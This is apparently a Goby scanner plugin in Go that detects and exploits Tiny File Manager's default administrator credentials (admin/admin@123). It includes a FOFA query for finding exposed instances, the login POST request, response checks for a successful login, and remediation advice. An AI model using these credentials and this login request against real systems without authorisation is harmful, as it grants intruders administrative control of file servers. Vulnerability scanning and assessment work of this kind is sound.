package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Tiny File Manager weak-pass vulnerability",
    "Description": "<p>Tiny File Manager is an open source Web-based File Manager.</p><p></p><p>Tiny File Manager has a default password vulnerability. Attackers can control the entire platform by using the default password admin/admin@123 and operate core functions with administrator rights.</p>",
    "Product": "Tiny File Manager",
    "Homepage": "https://tinyfilemanager.github.io/",
    "DisclosureDate": "2022-07-23",
    "Author": "橘先生",
    "FofaQuery": "body=\"Tiny File Manager\"",
    "GobyQuery": "body=\"Tiny File Manager\"",
    "Level": "1",
    "Impact": "<p>Tiny File Manager has a default password vulnerability. Attackers can control the entire platform by using the default password admin/admin@123 and operate core functions with administrator rights.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://github.com/prasathmani/tinyfilemanager"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"
                },
                "data_type": "text",
                "data": "fm_usr=admin&fm_pwd=admin%40123"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "/index.php?p=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "filemanager=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "==",
                        "value": "",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"
                },
                "data_type": "text",
                "data": "fm_usr=admin&fm_pwd=admin%40123"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "/index.php?p=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "filemanager=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "==",
                        "value": "",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|text|admin:admin@123"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7",
    "Translation": {
        "CN": {
            "Name": "Tiny File Manager 默认口令漏洞",
            "Product": "Tiny File Manager",
            "Description": "<p><span style=\"color: rgb(41, 43, 44);\"></span><span style=\"color: rgb(0, 0, 0); font-size: 14px;\">Tiny File Manager是一款基于Web的开源文件管理器。</span><span style=\"color: rgb(41, 43, 44);\"></span><br></p><p><span style=\"color: rgb(41, 43, 44);\"><span style=\"color: rgb(41, 43, 44);\"><span style=\"color: rgb(0, 0, 0); font-size: 14px;\">Tiny File Manager</span>存在默认口令漏洞,攻击者使用默认口</span>令 admin/adm<span style=\"color: rgb(41, 43, 44);\">in@123 即可控制整个平台，使用管理员权限操作核心的功能。</span></span></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p><span style=\"color: rgb(41, 43, 44); font-size: 16px;\"><span style=\"color: rgb(0, 0, 0); font-size: 14px;\">Tiny File Manager</span>存在默认口令漏洞,攻击者使用默认口</span><span style=\"color: rgb(41, 43, 44); font-size: 16px;\">令 admin/adm</span><span style=\"color: rgb(41, 43, 44); font-size: 16px;\">in@123 即可控制整个平台，使用管理员权限操作核心的功能。</span><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Tiny File Manager weak-pass vulnerability",
            "Product": "Tiny File Manager",
            "Description": "<p style=\"text-align: justify;\">Tiny File Manager is an open source Web-based File Manager.</p><p style=\"text-align: justify;\"></p><p style=\"text-align: justify;\"><span style=\"color: rgb(74, 144, 226);\">Tiny File Manager has a default password vulnerability. Attackers can control the entire platform by using the default password admin/admin@123 and operate core functions with administrator rights.</span></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p><span style=\"color: rgb(74, 144, 226);\">Tiny File Manager has a default password vulnerability. Attackers can control the entire platform by using the default password admin/admin@123 and operate core functions with administrator rights.</span><br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10697"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}